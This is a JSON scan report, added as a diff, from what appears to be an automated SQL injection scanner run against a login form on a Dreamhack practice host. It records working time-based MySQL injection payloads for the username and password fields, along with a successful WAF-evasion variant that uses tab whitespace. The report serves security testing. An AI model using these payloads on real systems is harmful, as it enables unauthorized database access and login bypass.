@@ -1,0 +1,101 @@
+{
+  "scanned_at": "2026-09-09T08:44:28.502430+00:00",
+  "total": 2,
+  "vulnerabilities": [
+    {
+      "vuln_type": "SQLi",
+      "severity": "HIGH",
+      "url": "http://host3.dreamhack.games:10285/login",
+      "param": "username",
+      "method": "POST",
+      "surface_type": "form_field",
+      "payload": "' OR (SELECT 1 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #",
+      "evidence": "Time-based SQL Injection | db=MySQL_OR_BENCHMARK",
+      "detail": {
+        "type": "Time-based SQL Injection",
+        "detected_db": "MySQL_OR_BENCHMARK",
+        "payload": "' OR (SELECT 1 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #",
+        "baseline_duration": 0.17,
+        "attack_time": 9.7,
+        "verify_time": 0.16,
+        "reproduced_time": 10.12,
+        "waf_evaded": false,
+        "waf_hits": [],
+        "waf_evasions": [],
+        "stateful": false,
+        "idem_trace": [
+          0,
+          0,
+          0,
+          0
+        ],
+        "attack_vectors": {
+          "error_based": {
+            "possible": false
+          },
+          "UNION": {
+            "possible": false
+          },
+          "blind_boolean": {
+            "possible": false,
+            "dialect": null
+          },
+          "blind_time": {
+            "possible": true,
+            "dialect": "MySQL"
+          }
+        }
+      }
+    },
+    {
+      "vuln_type": "SQLi",
+      "severity": "HIGH",
+      "url": "http://host3.dreamhack.games:10285/login",
+      "param": "password",
+      "method": "POST",
+      "surface_type": "form_field",
+      "payload": "' OR (SELECT 1 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #",
+      "evidence": "Time-based SQL Injection | db=MySQL_OR_BENCHMARK",
+      "detail": {
+        "type": "Time-based SQL Injection",
+        "detected_db": "MySQL_OR_BENCHMARK",
+        "payload": "' OR (SELECT 1 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #",
+        "baseline_duration": 0.17,
+        "attack_time": 10.16,
+        "verify_time": 0.16,
+        "reproduced_time": 10.05,
+        "waf_evaded": false,
+        "waf_hits": [
+          "boolean(equiv-false)(\"%' AND 8<3 #\") → 우회 7종 + 조합 전부 실패",
+          "boolean(equiv-true)(\"%' AND 8>3 #\") → 우회 7종 + 조합 전부 실패"
+        ],
+        "waf_evasions": [
+          "boolean(false): alt_whitespace 우회 성공 → \"%'\tOR\t1=2\tLIMIT\t1\t#\""
+        ],
+        "stateful": false,
+        "idem_trace": [
+          0,
+          0,
+          0,
+          0
+        ],
+        "attack_vectors": {
+          "error_based": {
+            "possible": false
+          },
+          "UNION": {
+            "possible": false
+          },
+          "blind_boolean": {
+            "possible": false,
+            "dialect": null
+          },
+          "blind_time": {
+            "possible": true,
+            "dialect": "MySQL"
+          }
+        }
+      }
+    }
+  ]
+}
